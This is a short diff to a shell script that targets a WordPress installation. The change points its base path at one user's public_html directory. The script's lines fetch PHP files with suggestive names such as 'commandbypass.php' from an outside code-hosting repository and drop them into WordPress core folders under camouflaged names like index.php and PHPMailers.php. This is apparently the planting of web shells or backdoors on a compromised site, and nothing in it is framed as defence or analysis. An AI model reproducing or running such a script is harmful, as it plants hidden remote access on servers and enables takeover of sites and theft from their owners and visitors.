@@ -1,4 +1,4 @@
-base="/var/www/wordpress/"; \
+base="/home/smauausbysch/public_html/"; \
 [ -d "$base/wp-admin/css/colors/blue" ] && curl -s -o "$base/wp-admin/css/colors/blue/index.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/commandbypass.php; \
 [ -d "$base/wp-includes/PHPMailer" ] && curl -s -o "$base/wp-includes/PHPMailer/PHPMailers.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/fmbr2.php; \
 [ -d "$base/wp-content/languages" ] && curl -s -o "$base/wp-content/languages/index.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/maviest.php; \
